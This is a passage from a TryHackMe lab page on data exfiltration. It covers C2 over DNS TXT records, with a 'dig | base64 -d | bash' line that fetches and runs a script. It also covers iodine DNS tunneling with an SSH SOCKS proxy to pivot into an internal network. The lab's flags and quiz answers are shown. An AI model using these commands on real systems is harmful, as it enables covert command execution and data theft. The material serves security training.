87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">TXT</span><span style="font-size:1rem">&nbsp;DNS record to the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">tunnel.com</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">domain name.</span></p><p><span>For example, let's say we have a script that needs to be executed in a victim machine. First, we need to encode the script as a Base64 representation and then create a TXT <a class="ljNgIMkn glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;ljNgIMkn&#39;)">DNS</a> record of the domain name you control with the content of the encoded script. The following is an example of the required script that needs to be added to the domain name:</span><br></p>

<pre class=" language-bash" tabindex="0"><code class=" language-bash"><span class="token shebang important">#!/bin/bash </span>
<span class="token function">ping</span> -c <span class="token number">1</span> test.thm.com</code></pre>
<p>The script executes the ping command in a victim machine and sends one ICMP packet to&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">test.tunnel.com</span>. Note that the script is an example, which could be replaced with any content. Now&nbsp;<span style="font-size:1rem">save the script to</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">/tmp/script.sh</span>&nbsp;<span style="font-size:1rem">using your favorite text editor and then</span><span style="font-size:1rem">&nbsp;encode it with Base64 as follows,</span></p><p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Encode the Bash Script as Base64 Representation<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@victim2$ cat /tmp/script.sh | base64 
IyEvYmluL2Jhc2gKcGluZyAtYyAxIHRlc3QudGhtLmNvbQo=</code>
	    </pre></div></div><p></p><p>Now that we have the Base64 representation of our script, we add it as a&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">TXT</span>&nbsp;DNS record to the domain we control, which in this case, the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">tunnel.com</span>. You can add it through the web interface we provide&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">http://MACHINE_IP/</span><span style="font-size:1rem">&nbsp;or&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">https://LAB_WEB_URL.p.thmlabs.com/</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">without using a VPN.</span><span style="font-size:1rem">&nbsp;</span></p><p style="text-align:left"><span style="font-size:1rem"><span>Once we added it, let's confirm that we successfully created the script's <a class="k2KZBTAK glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;k2KZBTAK&#39;)">DNS</a> record by&nbsp;</span></span><span style="font-size:1rem"><span>asking the local <a class="nP9mQJRE glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;nP9mQJRE&#39;)">DNS</a> server to resolve the TXT record of the&nbsp;</span></span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">script.tunnel.com</span><span style="font-size:1rem">. If everything is set up correctly, we should receive the content we added in the previous step.&nbsp;</span><br></p><p style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/38b87cfbbe254bef1e98f0dffa49451f.png" alt="DNS Server - Resolving TXT Record"><br></p><p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Confirm the TXT record is Added Successfully<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@victim2$ dig +short -t TXT script.tunnel.com</code>
	    </pre></div></div><p></p><p><span>We used the dig command to check the TXT record of our <a class="VPODijsT glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;VPODijsT&#39;)">DNS</a> record that we added in the previous step! As a result, we can get the content of our script in the TXT reply. Now we confirmed the TXT record, let's execute it as follows,</span></p><p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Execute the Bash Script!<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@victim2$ dig +short -t TXT script.tunnel.com | tr -d "\"" | base64 -d | bash</code>
	    </pre></div></div><p></p><p>Note that we cleaned the output before executing the script using&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">tr</span>&nbsp;and deleting any double quotes&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">"</span>. Then, we decoded the Base64 text representation using&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">base64 -d</span>&nbsp;and finally passed the content to the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">bash</span>&nbsp;command to execute.&nbsp;</p><p><span>Now replicate the <a class="Mth5Kdp0 glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;Mth5Kdp0&#39;)">C2</a> Communication steps to execute the content of the flag.tunnel.com TXT record and answer the question below.</span><br></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>What is the maximum length for the subdomain name (label)?</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: **" value="63" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="9">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>The Fully Qualified&nbsp;FQDN&nbsp;domain name must not exceed ______&nbsp;<span style="font-size:1rem">characters.</span></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***" value="255" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="9">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details"><span>
                                Execute the C2 communication over the DNS protocol of the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">flag.tunnel.com</span>. What is the flag?
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{*****************************}" value="THM{C-tw0-C0mmun1c4t10ns-0v3r-DN5}" disabled="">
                            <input type="hidden" value="3">
                            <input type="hidden" value="9">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-10">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse10">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 10                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> DNS Tunneling
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse10" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p><span>This task will show how to create a tunnel through the <a class="F4hInXRQ glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;F4hInXRQ&#39;)">DNS</a> protocol. Ensure that you understand the concept discussed in the previous task (Exifltration over DNS), as DNS Tunneling tools work based on the same technique.</span></p><p><span style="font-size:24px"><span><a class="66Cbmcqd glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;66Cbmcqd&#39;)">DNS</a> Tunneling (TCPoverDNS)</span></span><br></p>
<p><span>This technique is also known as <a class="Vr8kArq7 glossary-term" onclick="initPopOver(&#39;TCP&#39;, &#39;Vr8kArq7&#39;)">TCP</a> over DNS, where an attacker encapsulates other protocols, such as HTTP requests, over the DNS protocol using the DNS Data Exfiltration technique. DNS Tunneling establishes a communication channel where data is sent and received continuously.</span></p>
<p style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/8176731af9ec61cf248cdbc65df92172.png" alt="DNS Tunneling - Data Flow"><span style="font-size:1rem"><br></span></p><p style="text-align:left"><span>This section will go through the steps required to establish a communication channel over the <a class="9uZ2Jy3r glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;9uZ2Jy3r&#39;)">DNS</a>. We will apply the technique to the network infrastructure we provided (</span><b>JumpBox </b>and <b>Victim2</b>) to pivot from Network 2 (192.168.0.0/24) to Network 1 (172.20.0.0/24) and access the internal web server. For more information about the network infrastructure, please check task 2.</p><p style="text-align:left"><span style="font-size:1rem">We will be using the <a href="https://github.com/yarrick/iodine" target="_blank">iodine </a><span>tool for creating our <a class="Fj9DSuz8 glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;Fj9DSuz8&#39;)">DNS</a> tunneling communications. Note that we have already installed&nbsp;</span></span><a href="https://github.com/yarrick/iodine" target="_blank">iodine&nbsp;</a><span style="font-size:1rem">on the JumpBox and Attacker machines.&nbsp;</span><span>To establish <a class="PbEuI0nh glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;PbEuI0nh&#39;)">DNS</a> tunneling, we need to follow the following steps:</span></p><ol><li style="text-align:left"><span>Ensure to update the <a class="Mhb28mRP glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;Mhb28mRP&#39;)">DNS</a> records and create new NS points to your AttackBox machine (Check Task 8), or you can use the preconfigured nameserver, which points to the Attacker machine (att.tunnel.com=172.20.0.200).</span></li><li style="text-align:left">Run <b>iodined</b> server from AttackBox or the Attacker machine. (note for the <b>server</b> side we use iodine<b>d</b>)</li><li style="text-align:left">On JumpBox, run the iodine client to establish the connection. (note for the client side we use iodine - without <b>d)</b></li><li style="text-align:left"><span>SSH to the machine on the created network interface to create a proxy over <a class="cO7V83qi glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;cO7V83qi&#39;)">DNS</a>. We will be using the -D argument to create a dynamic port forwarding.</span></li><li style="text-align:left">Once an SSH connection is established, we can use the local IP and the local port as a proxy in Firefox or ProxyChains.</li></ol>
<p><span>Let's follow the steps to create a <a class="CuhfEcO9 glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;CuhfEcO9&#39;)">DNS</a> tunnel. First, let's run the server-side application (iodined) as follows,</span></p>
<p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Running iodined Server<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup"><span>thm@attacker$ sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com                                                                                                                                                                     
Opened dns0
Setting IP of dns0 to 10.1.1.1
Setting MTU of dns0 to 1130
Opened IPv4 UDP socket
Listening to dns for domain att.tunnel.com</span></code>
	    </pre></div></div><p></p>
<p>Let's explain the previous command a bit more:</p><ul><li><span>Ensure to execute the command with sudo. The iodined creates a new network interface (dns0) for the tunneling over the <a class="ik5tCQIi glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;ik5tCQIi&#39;)">DNS</a>.</span></li><li>The -f argument is to run the server in the foreground.</li><li><span>The -c argument is to skip checking the client IP address and port for each <a class="KdYbEt7S glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;KdYbEt7S&#39;)">DNS</a> request.</span></li><li>The -P argument&nbsp;is to set a password for authentication.</li><li>&nbsp;The 10.1.1.1/24 argument is to set the network IP for the new network interface (dns0). The IP address of the server will be 10.1.1.1 and the client 10.1.1.2.</li><li>att.tunnel.com is the nameserver we previously set.</li></ul><p>
<asciinema-player src="https://asciinema.org/a/503133.cast" cols="160" rows="24"><div data-reactroot="" tabindex="-1" class="asciinema-player-wrapper hud"><div class="asciinema-player asciinema-theme-asciinema"><pre class="asciinema-terminal font-small" style="width: 160ch; height: 32em;"><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span></pre><div class="control-bar"><span class="playback-button"><svg version="1.1" viewBox="0 0 12 12" class="icon"><path d="M1,0 L11,6 L1,12 Z"></path></svg></span><span class="timer"><span class="time-elapsed">00:00</span><span class="time-remaining">-00:00</span></span><span class="fullscreen-button"><svg version="1.1" viewBox="0 0 12 12" class="icon"><path d="M12,0 L7,0 L9,2 L7,4 L8,5 L10,3 L12,5 Z"></path><path d="M0,12 L0,7 L2,9 L4,7 L5,8 L3,10 L5,12 Z"></path></svg><svg version="1.1" viewBox="0 0 12 12" class="icon"><path d="M7,5 L7,0 L9,2 L11,0 L12,1 L10,3 L12,5 Z"></path><path d="M5,7 L0,7 L2,9 L0,11 L1,12 L3,10 L5,12 Z"></path></svg></span><span class="progressbar"><span class="bar"><span class="gutter"><span></span></span></span></span></div><div class="start-prompt"><div class="play-button"><div><span><svg version="1.1" viewBox="0 0 866.0254037844387 866.0254037844387" class="icon"><defs> <mask id="small-triangle-mask"> <rect width="100%" height="100%" fill="white"></rect> <polygon points="508.01270189221935 433.01270189221935, 208.0127018922194 259.8076211353316, 208.01270189221927 606.217782649107" fill="black"></polygon> </mask> </defs> <polygon points="808.0127018922194 433.01270189221935, 58.01270189221947 -1.1368683772161603e-13, 58.01270189221913 866.0254037844386" mask="url(#small-triangle-mask)" fill="white"></polygon> <polyline points="481.2177826491071 333.0127018922194, 134.80762113533166 533.0127018922194" stroke="white" stroke-width="90"></polyline></svg></span></div></div></div></div></div></asciinema-player></p><p>On the JumpBox machine, we need to connect to the server-side application. To do so, we need to execute the following:</p>
<p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Victim Connects to the Server<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup"><span>thm@jump-box:~$ sudo iodine -P thmpass att.tunnel.com                                                                                                           
Opened dns0                                                                                                                                                     
Opened IPv4 UDP socket                                                                                                                                          
Sending DNS queries for att.tunnel.com to 127.0.0.11                                                                                                            
Autodetecting DNS query type (use -T to override).                                                                                                              
Using DNS type NULL queries                                                                                                                                     
Version ok, both using protocol v 0x00000502. You are user #0                                                                                                   
Setting IP of dns0 to 10.1.1.2                                                                                                                                  
Setting MTU of dns0 to 1130                                                                                                                                     
Server tunnel IP is 10.1.1.1                                                                                                                                    
Testing raw UDP data to the server (skip with -r)                                                                                                               
Server is at 172.20.0.200, trying raw login: OK                                                                                                                 
Sending raw traffic directly to 172.20.0.200                                                                                                                    
Connection setup complete, transmitting data.</span></code>
	    </pre></div></div><p></p>
<p>Note that we executed the client-side tool (iodine) and provided the -f and -P arguments explained before. Once the connection is established, we open a new terminal and log in to 10.1.1.1 via SSH. </p><p>
<asciinema-player src="https://asciinema.org/a/503134.cast" cols="160" rows="24"><div data-reactroot="" tabindex="-1" class="asciinema-player-wrapper hud"><div class="asciinema-player asciinema-theme-asciinema"><pre class="asciinema-terminal font-small" style="width: 160ch; height: 32em;"><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span></pre><div class="control-bar"><span class="playback-button"><svg version="1.1" viewBox="0 0 12 12" class="icon"><path d="M1,0 L11,6 L1,12 Z"></path></svg></span><span class="timer"><span class="time-elapsed">00:00</span><span class="time-remaining">-00:00</span></span><span class="fullscreen-button"><svg version="1.1" viewBox="0 0 12 12" class="icon"><path d="M12,0 L7,0 L9,2 L7,4 L8,5 L10,3 L12,5 Z"></path><path d="M0,12 L0,7 L2,9 L4,7 L5,8 L3,10 L5,12 Z"></path></svg><svg version="1.1" viewBox="0 0 12 12" class="icon"><path d="M7,5 L7,0 L9,2 L11,0 L12,1 L10,3 L12,5 Z"></path><path d="M5,7 L0,7 L2,9 L0,11 L1,12 L3,10 L5,12 Z"></path></svg></span><span class="progressbar"><span class="bar"><span class="gutter"><span></span></span></span></span></div><div class="start-prompt"><div class="play-button"><div><span><svg version="1.1" viewBox="0 0 866.0254037844387 866.0254037844387" class="icon"><defs> <mask id="small-triangle-mask"> <rect width="100%" height="100%" fill="white"></rect> <polygon points="508.01270189221935 433.01270189221935, 208.0127018922194 259.8076211353316, 208.01270189221927 606.217782649107" fill="black"></polygon> </mask> </defs> <polygon points="808.0127018922194 433.01270189221935, 58.01270189221947 -1.1368683772161603e-13, 58.01270189221913 866.0254037844386" mask="url(#small-triangle-mask)" fill="white"></polygon> <polyline points="481.2177826491071 333.0127018922194, 134.80762113533166 533.0127018922194" stroke="white" stroke-width="90"></polyline></svg></span></div></div></div></div></div></asciinema-player></p><p><span>Note that all communication over the network 10.1.1.1/24 will be over the <a class="FnskiJ8Y glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;FnskiJ8Y&#39;)">DNS</a>. We will be using the -D argument for the dynamic port forwarding feature to use the SSH session as a proxy. Note that we used the -f argument to enforce ssh&nbsp;to go to the background. The -4 argument forces the ssh client to bind on IPv4 only.&nbsp;</span></p>
<p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top"><span>SSH over <a class="9hLQH7gj glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;9hLQH7gj&#39;)">DNS</a></span><br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">root@attacker$ ssh thm@10.1.1.2 -4 -f -N -D 1080</code>	    </pre></div></div><p></p>
<p>Now that we have connected to JumpBox over the dns0 network, open a new terminal and use ProxyChains or Firefox with 127.0.0.1 and port 1080 as proxy settings.&nbsp;</p>
<p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Use SSH Connection as a Proxy<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">root@attacker$ proxychains curl http://192.168.0.100/demo.php
root@attacker$ #OR
root@attacker$ curl --socks5 127.0.0.1:1080 http://192.168.0.100/demo.php</code>
	    </pre></div></div><p></p>
<p><asciinema-player src="https://asciinema.org/a/503136.cast" cols="160" rows="24"><div data-reactroot="" tabindex="-1" class="asciinema-player-wrapper hud"><div class="asciinema-player asciinema-theme-asciinema"><pre class="asciinema-terminal font-small" style="width: 160ch; height: 32em;"><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"></span></pre><div class="control-bar"><span class="playback-button"><svg version="1.1" viewBox="0 0 12 12" class="icon"><path d="M1,0 L11,6 L1,12 Z"></path></svg></span><span class="timer"><span class="time-elapsed">00:00</span><span class="time-remaining">-00:00</span></span><span class="fullscreen-button"><svg version="1.1" viewBox="0 0 12 12" class="icon"><path d="M12,0 L7,0 L9,2 L7,4 L8,5 L10,3 L12,5 Z"></path><path d="M0,12 L0,7 L2,9 L4,7 L5,8 L3,10 L5,12 Z"></path></svg><svg version="1.1" viewBox="0 0 12 12" class="icon"><path d="M7,5 L7,0 L9,2 L11,0 L12,1 L10,3 L12,5 Z"></path><path d="M5,7 L0,7 L2,9 L0,11 L1,12 L3,10 L5,12 Z"></path></svg></span><span class="progressbar"><span class="bar"><span class="gutter"><span></span></span></span></span></div><div class="start-prompt"><div class="play-button"><div><span><svg version="1.1" viewBox="0 0 866.0254037844387 866.0254037844387" class="icon"><defs> <mask id="small-triangle-mask"> <rect width="100%" height="100%" fill="white"></rect> <polygon points="508.01270189221935 433.01270189221935, 208.0127018922194 259.8076211353316, 208.01270189221927 606.217782649107" fill="black"></polygon> </mask> </defs> <polygon points="808.0127018922194 433.01270189221935, 58.01270189221947 -1.1368683772161603e-13, 58.01270189221913 866.0254037844386" mask="url(#small-triangle-mask)" fill="white"></polygon> <polyline points="481.2177826491071 333.0127018922194, 134.80762113533166 533.0127018922194" stroke="white" stroke-width="90"></polyline></svg></span></div></div></div></div></div></asciinema-player></p><p><span>We can confirm that all traffic goes through the <a class="vfOQWqoy glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;vfOQWqoy&#39;)">DNS</a> protocol by checking the Tcpdump on the&nbsp;</span><b>Attacker </b>machine&nbsp;through the <b>eth0 </b>interface.</p><p></p><div style="text-align:center"></div><div style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/ffbd2ecb2563c649fde174b40c450097.png" alt="Capturing DNS traffic" style="width:100%"><br></div><p></p>
<p><span>Apply the <a class="OKWRbz7J glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;OKWRbz7J&#39;)">DNS</a> tunneling technique in the provided network environment and access&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">http://192.168.0.100/test.php</span><span style="font-size:1rem">&nbsp;to answer the question below</span><span style="font-size:1rem">.</span></p>
</div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">When the iodine connection establishes to Attacker, run the&nbsp;</span><strong>ifconfig&nbsp;</strong><span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">command. How many interfaces are? (including the loopback interface)</span>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *" value="4" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="10">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        <div class="room-task-input-hint">
                            <button type="button" class="btn btn-dorange faded btn-noline task-hint" onclick="getHint(this)">
                        <i class="fal fa-lightbulb"></i> Hint
                      </button>
                        </div>
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>What is the network interface name created by iodined?&nbsp;<br></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ****" value="dns0" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="10">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details"><span>
                                &nbsp;Use the DNS tunneling to prove your access to the webserver,&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background-color:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">http://192.168.0.100/test.php</span><span style="font-size:1rem">&nbsp;</span>. What is the flag?
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{*********************" value="THM{DN5-Tunn311n9-1s-c00l" disabled="">
                            <input type="hidden" value="3">
                            <input type="hidden" value="10">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        <div class="room-task-input-hint">
                            <button type="button" class="btn btn-dorange faded btn-noline task-hint" onclick="getHint(this)">
                        <i class="fal fa-lightbulb"></i> Hint
                      </button>
                        </div>
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-11">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse11">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 11                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Conclusion
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse11" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <div><span style="font-size:24px">Wrapping Up</span><br></div><p>In this room, we covered the basics of data exfiltration<span style="font-size:1rem">&nbsp;techniques, including various network protocols:</span></p><ul><li><span style="font-size:1rem"><span><a class="ZoNvRhaC glossary-term" onclick="initPopOver(&#39;TCP&#39;, &#39;ZoNvRhaC&#39;)">TCP</a> Sockets</span></span></li><li><span style="font-size:1rem">SSH</span></li><li><span style="font-size:1rem">HTTP/HTTPS</span></li><li><span style="font-size:1rem">ICMP</span></li><li><span style="font-size:1rem"><span><a class="MkwFcVjC glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;MkwFcVjC&#39;)">DNS</a></span></span></li></ul><p><span style="font-size:1rem"> After finishing up this room, you should now have a general understanding of what Data Exfiltration is, and the types and protocols that you could try to use to transfer data.</span><br></p><p><span style="font-size:24px">Examples</span></p><p>The following are companies that were victims of data breaches using data exfiltration techniques.</p><ol><li><b>SunTrust Bank</b>&nbsp;had an insider data breach that uncovered suspicious traffic leaving the network after the theft of up to 1.5 million customer-sensitive data, including names, addresses, phone numbers, and account balances.</li><li><b>Tesla</b><span>&nbsp;was a victim of data exfiltration by an insider, which caused a data breach. In 2018, an employee exfiltrated gigabytes of confidential photos and code manufacturing <a class="HxY6FEfN glossary-term" onclick="initPopOver(&#39;OS&#39;, &#39;HxY6FEfN&#39;)">OS</a> to third parties, including other personal and sensitive data.</span></li><li><b>Travelex</b><span>&nbsp;is the world's leading currency exchange specialist. In 2020, it was a victim of ransomware called Sodinokibi. The attacker exploits an unpatched vulnerability of one of the internal servers. The attacker exploited an unpatched vulnerability in one of the internal servers, which allowed them to exfiltrate sensitive data out of the organization's network using one of the exfiltration techniques. The sensitive data included personally identifiable information (<a class="ghsw6sUq glossary-term" onclick="initPopOver(&#39;PII&#39;, 